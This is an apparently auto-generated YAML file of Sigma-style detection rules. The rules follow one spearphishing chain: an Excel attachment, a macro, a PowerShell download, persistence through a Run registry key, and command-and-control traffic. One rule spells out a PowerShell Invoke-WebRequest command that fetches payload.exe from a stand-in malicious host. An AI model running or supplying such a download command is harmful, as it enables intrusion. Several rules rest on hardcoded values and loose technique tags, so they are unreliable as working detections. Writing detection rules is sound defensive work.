```yaml
- title: Identify Initial Access via Spearphishing Email
  id: 123e4567-e89b-12d3-a456-426614174000
  description: Monitor for events where the srcNode is an email application (e.g., Outlook) and the dstNode is an attachment with the name "Invoice_2023.xlsx".
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Name: "Outlook"
        Type: "Process"
      dstNode:
        Name: "Invoice_2023.xlsx"
        Type: "File"
      relation: "Process Create"
  condition: selection
  tags:
    - T1566
    - Initial Access
  level: high
---
- title: Track Opening of Malicious Attachment
  id: 123e4567-e89b-12d3-a456-426614174001
  description: Detect when the srcNode is Outlook and the dstNode is Excel, with the dstNode having the Image or Cmdline indicating it is opening "Invoice_2023.xlsx".
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Name: "Outlook"
        Type: "Process"
      dstNode:
        Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
        Cmdline: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE \"C:\\path\\to\\Invoice_2023.xlsx\""
        Type: "Process"
      relation: "Process Create"
  condition: selection
  tags:
    - T1203
    - Initial Access
  level: high
---
- title: Monitor for Macro Execution in Excel
  id: 123e4567-e89b-12d3-a456-426614174002
  description: Identify events where the srcNode is Excel and the relation indicates macro execution (e.g., "Process Create").
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
        Type: "Process"
      dstNode:
        Name: "Macro Code"
        Type: "Process"
      relation: "Process Create"
  condition: selection
  tags:
    - T1059
    - Execution
  level: medium
---
- title: Detect PowerShell Command for Downloading Payload
  id: 123e4567-e89b-12d3-a456-426614174003
  description: Monitor for events where the srcNode is Excel and the dstNode is PowerShell executing a command to download a file from a remote server.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
        Type: "Process"
      dstNode:
        Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        Cmdline: "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe' -OutFile 'C:\\Users\\Victim\\Downloads\\payload.exe'\""
        Type: "Process"
      relation: "Process Create"
  condition: selection
  tags:
    - T1059
    - Execution
  level: high
---
- title: Monitor Execution of Downloaded Payload
  id: 123e4567-e89b-12d3-a456-426614174004
  description: Identify events where the srcNode is PowerShell and the dstNode is the executable "payload.exe".
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        Type: "Process"
      dstNode:
        Image: "C:\\Users\\Victim\\Downloads\\payload.exe"
        Type: "Process"
      relation: "Process Create"
  condition: selection
  tags:
    - T1203
    - Execution
  level: medium
---
- title: Track Registry Modifications for Persistence
  id: 123e4567-e89b-12d3-a456-426614174005
  description: Monitor for events where the srcNode is "payload.exe" and the dstNode indicates a registry modification under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MaliciousApp.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Image: "C:\\Users\\Victim\\Downloads\\payload.exe"
        Type: "Process"
      dstNode:
        Key: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MaliciousApp"
        Type: "Registry"
      relation: "RegSetValue"
  condition: selection
  tags:
    - T1547
    - Persistence
  level: medium
---
- title: Monitor Command and Control Communication
  id: 123e4567-e89b-12d3-a456-426614174006
  description: Identify outbound network traffic where the srcNode is "payload.exe" and the dstNode indicates a connection to "http://malicious-server.com".
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Image: "C:\\Users\\Victim\\Downloads\\payload.exe"
        Type: "Process"
      dstNode:
        Dstaddress: "malicious-server.com"
        Port: 80
        Type: "Network"
      relation: "TCP Connect"
  condition: selection
  tags:
    - T1071
    - Command and Control
  level: high
```